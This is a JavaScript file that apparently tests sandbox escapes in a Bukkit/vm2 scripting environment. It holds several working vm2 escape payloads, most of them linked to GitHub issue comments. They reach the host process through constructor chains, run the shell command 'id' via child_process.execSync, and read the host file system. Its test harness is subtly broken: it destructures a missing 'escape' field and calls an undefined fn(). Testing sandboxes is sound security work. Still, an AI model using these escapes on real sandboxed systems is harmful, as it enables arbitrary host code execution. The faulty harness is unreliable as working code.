// Todo add a reference to the comment with the code for every experiment
let escape_experiment = ({ source_page, escape }) => {
    try {
        fn();
        console.error(`${ChatColor.RED}No error in the experiment`)
    } catch (error) {}
}

escape_experiment({
    source_page: 'myself',
    run: () => {
        console.log('Bukkit:', Java.type('org.bukkit.Bukkit').class)
        console.log('Server:', Java.type('org.bukkit.Bukkit').static.getServer())
    },
});

escape_experiment({
    source_page: null,
    run: () => {
        try {
            this.process.removeListener(); // or .on, .once, or anything that throws a host exception
        } catch (host_exception) {
            // console.log('host exception: ' + host_exception.toString());
            host_constructor = host_exception.constructor.constructor;
            host_process = host_constructor('return this')().process;
            return host_process.mainModule.require('child_process').execSync('id').toString();
        }
    },
});

escape_experiment({
    source_page: 'https://github.com/patriksimek/vm2/issues/32#issue-160537607',
    run: () => {
        const ForeignFunction = global.constructor.constructor;
        const process1 = ForeignFunction("return process")();
        const require1 = process1.mainModule.require;
        const console1 = require1("console");
        const fs1 = require1("fs");
        console1.log(fs1.statSync('.'));
    }
})

escape_experiment({
    source_page: 'https://github.com/patriksimek/vm2/issues/32#issuecomment-226580697',
    run: () => {
        function exploit(o) {
            const foreignFunction = o.constructor.constructor;
            const process = foreignFunction('return process')();
            const require = process.mainModule.require;
            const console = require('console');
            const fs = require('fs');

            console.log(fs.statSync('.'));

            return o;
        }

        Reflect.construct = exploit;
        new Buffer([0]);
    }
})

escape_experiment({
    source_page: 'https://github.com/patriksimek/vm2/issues/32#issuecomment-226974819',
    run: () => {
        let process = global.constructor.constructor('return this')().constructor.constructor('return process')();
        if (process == null) {
            throw new Error('Could not escape from vm2');
        } else {
            return process;
        }
    }
});
